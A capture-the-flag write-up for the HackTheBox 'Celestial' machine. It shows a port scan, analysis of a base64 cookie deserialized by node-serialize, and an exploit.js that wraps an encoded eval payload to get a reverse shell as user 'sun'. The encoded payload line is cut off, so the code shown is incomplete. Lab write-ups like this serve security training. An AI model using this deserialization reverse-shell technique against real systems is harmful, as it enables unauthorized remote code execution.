# Recon

As usual we start with a port scan on the target:
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.85 -T5
```

That only reveals an open port on 3000 running the Node.js Express Framework. 

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/1.png">

# Enumeration

After browsing to the website we run into a 404. But after refreshing we get different message. BurpSuite shows that on the first visit a cookie is set and after revisiting this is passed as a parameter.

Removing the following from the get request resulted in an error. This tells us that the data appears to be unserialized. We also spot a username: ```sun```.
```
Upgrade-Insecure-Requests: 1
If-None-Match: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/2.png">

The cookie appears to be base64 encoded. After decoding we get the following result:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/3.png">

Changing the ```num``` has an effect on the formula. We can mess with the parameters to generate the same kind of error we got before.

# Initial Foothold
We can use nodejsshell.py to create a encoded NodeJS reverse shell. We'll first have to create a payload, serialize it, base64 encode it and finally send it as the cookie parameter. 

[nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)

First we'll run ```python nodejsshell.py [Listener IP] [Listener Port]``` to create the encoded shell:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/4.png">


Then we'll create an ```exploit.js``` file which we use to serialize the payload so that it matches the website's.
```
var y = { rce: function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,10>
}
var serialize = require('node-serialize');
var s = serialize.serialize(y)
console.log("Serialized: \n" + s.slice(0,-2) + "()" + s.slice(-2,));

```

Running ```nodejs exploit.js``` will create our serialized payload.

I had a issue saying the node-serilize module could not be found. Running ```npm install``` solved this.

After this we finally base64 encode it so we can pass it as the cookie parameter. We make sure to have our listener ready before we send our request with BurpSuite. This will result in an error but at the same time provides us with a reverse shell as user ```sun```.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/5.png">









